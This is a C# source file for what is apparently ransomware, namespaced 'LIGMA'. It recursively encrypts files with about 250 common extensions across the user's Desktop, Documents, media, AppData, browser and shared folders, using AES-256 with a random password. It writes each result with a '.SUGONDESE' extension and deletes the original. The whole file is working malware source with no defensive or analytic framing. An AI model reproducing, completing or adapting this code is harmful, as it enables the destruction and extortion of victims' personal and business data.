using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace LIGMA {

    class FileEncryption {

        public static string encryptPASS;

        public static string RandomString(int length) { const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; return new string(Enumerable.Repeat(chars, length).Select(s => s[random_.Next(s.Length)]).ToArray()); }

        private static Random random_ = new Random();

        public static void EncryptFiles() { encryptPASS = RandomString(25); GCHandle gcHandle = GCHandle.Alloc(FileEncryption.encryptPASS, GCHandleType.Pinned); EncryptAllFiles(FileEncryption.encryptPASS); }

        public static void FileEncrypt(string file, string password) {

            byte[] fileBytes = File.ReadAllBytes(file);
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            MemoryStream memoryStream = new MemoryStream();
            RijndaelManaged EncryptMethod = new RijndaelManaged();
            CryptoStream EncryptStream = new CryptoStream(memoryStream, EncryptMethod.CreateEncryptor(), CryptoStreamMode.Write);
            Rfc2898DeriveBytes rfc2898 = new Rfc2898DeriveBytes(SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password)), salt, 1000);
            EncryptMethod.KeySize = 256;
            EncryptMethod.BlockSize = 128;
            EncryptMethod.Key = rfc2898.GetBytes(EncryptMethod.KeySize / 8);
            EncryptMethod.IV = rfc2898.GetBytes(EncryptMethod.BlockSize / 8);
            EncryptMethod.Mode = CipherMode.CBC;
            EncryptStream.Write(fileBytes, 0, fileBytes.Length);
            EncryptStream.Close();
            File.WriteAllBytes(file + ".SUGONDESE", memoryStream.ToArray());
        }

        public static void EncryptDirectory(string path, string password) {

            try {

                string[] files = Directory.GetFiles(path);
                string[] directories = Directory.GetDirectories(path);
                for (int index = 0; index < files.Length; ++index) {

                    string extension = Path.GetExtension(files[index]).ToLower();
                    if (((IEnumerable<string>)Extentions.validExtensions).Contains(extension, StringComparer.CurrentCultureIgnoreCase)) {

                        FileEncrypt(files[index], password);
                        File.Delete(files[index]);
                    }
                }

                for (int index = 0; index < directories.Length; ++index) {

                    try {

                        EncryptDirectory(directories[index], password);
                    }

                    catch{

                    }
                }
            }

            catch{

            }
        }
        public static void EncryptAllFiles(string password) {

            List<string> EncryptPath = new List<string>();
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.History));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonOemLinks));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonTemplates));
            EncryptPath.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
            foreach (string currentPath in EncryptPath) {
                EncryptDirectory(currentPath, password);
            }
        }

        class Extentions {

            public static string[] validExtensions = new[] {

            ".txt",".zip",".iso",".msi",".gif",".jpg",".png",".cs",".h",".rar",".7zip",".tar.gz",".7z",".docx",".jpeg",".odt",".deb",".obj",".vb",".ps",".psd",".piv",".resource",
            ".otf",".jar",".py",".python",".z",".xml",".ico",".ai",".bmp",".contact",".mp4",".wmv",".object",".dat",".svg",".js",".cer",".htm",".html",".css",".ev3","ilk",
            ".swift",".mpeg",".mpg",".avi",".ppt",".pptx",".0",".1st",".600",".602",".abw",".acl",".log",".udo",".tdf",".fnt",".asc",".tab",".md2",".md3",".json",".plg",".wve",
            ".odf",".a",".war",".pdf",".dvi",".xsl-fo",".xps",".ps",".gz",".sti",".pps",".pot",".pez",".odp",".silo",".fits",".cbf",".ebf",".cbfx",".ebfx",".mcmeta",".assets",
            ".nut",".php?",".pl",".pm",".psc",".psm1",".rb",".sdl",".xpl",".ebuild",".raw",".3dm",".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",".mcfunction",".prefs",
            ".efx",".sdf",".vcf",".ses",".aaf",".aep",".aepx",".plb",".prel",".prproj",".aet",".ppj",".indd",".indl",".indt",".indb",".inx",".idml",".pmd",".tpk",".exp",".prfpset",
            ".dot",".docm",".dotx",".dotm",".docb",".rtf",".wpd",".wps",".msg",".xls",".xlt",".xlm",".xlsx",".xlsm",".xltx",".xltm",".xlsb",".xla",".xlam",".bep",".ncb",".prsl",
            ".xll",".xlw",".pptm",".potx",".potm",".asx",".flv",".vob",".m3u8",".mkv",".xqx",".eps",".swf",".fla",".as3",".doc",".md4",".md5",".pov",".x",".inc",".sln",".xmp",
            ".m4a",".dic",".rex",".hmg",".config",".resx",".res",".dxf",".cpp",".java",".csv",".ahk",".as",".bas",".lua",".nuc",".php",".c",".class",".go",".rc",".aps",".pek",
            ".asp",".aspx",".tif",".tiff",".w3d",".webp",".pkf",".wtv",".mp3",".ps.gz",".3mf",".ogg",".loc",".lock",".rbt",".ldr",".rxe",".lxf",".ev3",".lic",".umod",".cfa"
            };
        }
    }
}
